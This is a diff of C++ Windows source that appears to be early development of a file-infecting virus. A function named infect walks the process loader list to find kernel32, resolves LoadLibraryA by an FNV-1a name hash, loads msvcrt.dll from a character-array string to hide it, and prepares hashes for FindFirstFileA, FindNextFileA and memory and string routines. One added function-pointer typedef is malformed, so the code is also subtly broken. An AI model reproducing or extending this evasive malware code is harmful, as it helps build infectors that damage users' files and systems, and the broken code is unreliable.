@@ -3,13 +3,6 @@
 
 #include <windows.h>
 #include <winternl.h>
-/*
-typedef struct _UNICODE_STRING {
-  USHORT Length;
-  USHORT MaximumLength;
-  PWSTR  Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
-*/
 
 typedef struct FULL_PEB_LDR_DATA
 {
@@ -77,7 +70,8 @@ std::uint32_t fnv321a(const char *string)
 LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
 {
    const IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS *>(reinterpret_cast<const std::uint8_t *>(module)+module->e_lfanew);
-   const IMAGE_EXPORT_DIRECTORY *export_directory = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY *>(reinterpret_cast<const std::uint8_t *>(module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+   const IMAGE_EXPORT_DIRECTORY *export_directory = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY *>(
+      reinterpret_cast<const std::uint8_t *>(module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    const DWORD *name_pointers = reinterpret_cast<const DWORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNames);
    const WORD *name_ordinals = reinterpret_cast<const WORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNameOrdinals);
    const DWORD *functions = reinterpret_cast<const DWORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfFunctions);
@@ -85,7 +79,6 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
    for (std::uint32_t i=0; i<export_directory->NumberOfNames; ++i)
    {
       const char *name = reinterpret_cast<const char *>(reinterpret_cast<const std::uint8_t *>(module)+name_pointers[i]);
-      std::wcout << name << std::endl;
 
       if (fnv321a(name) != hash)
          continue;
@@ -95,6 +88,8 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
 
    return nullptr;
 }
+
+typedef HMODULE (LoadLibraryAHeader *)(LPCSTR);
 
 void infect(void)
 {
@@ -130,8 +125,17 @@ void infect(void)
    if (kernel32 == nullptr)
       return;
 
-   std::wcout << "LoadLibraryA: " << std::hex << (std::uintptr_t)get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f) << std::endl;
-   std::wcout << "GetProcAddress: " << std::hex << (std::uintptr_t)get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xf8f45725) << std::endl;
+   LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
+   char msvcrtDll[] = {'m','s','v','c','r','t','.','d','l','l',0};
+   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(msvcrtDll));
+
+   std::wcout << "malloc: " << std::hex << fnv321a("malloc") << std::endl;
+   std::wcout << "realloc: " << std::hex << fnv321a("realloc") << std::endl;
+   std::wcout << "free: " << std::hex << fnv321a("free") << std::endl;
+   std::wcout << "strncat: " << std::hex << fnv321a("strncat") << std::endl;
+   std::wcout << "strlen: " << std::hex << fnv321a("strlen") << std::endl;
+   std::wcout << "FindFirstFileA: " << std::hex << fnv321a("FindFirstFileA") << std::endl;
+   std::wcout << "FindNextFileA: " << std::hex << fnv321a("FindNextFileA") << std::endl;
 }
 
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
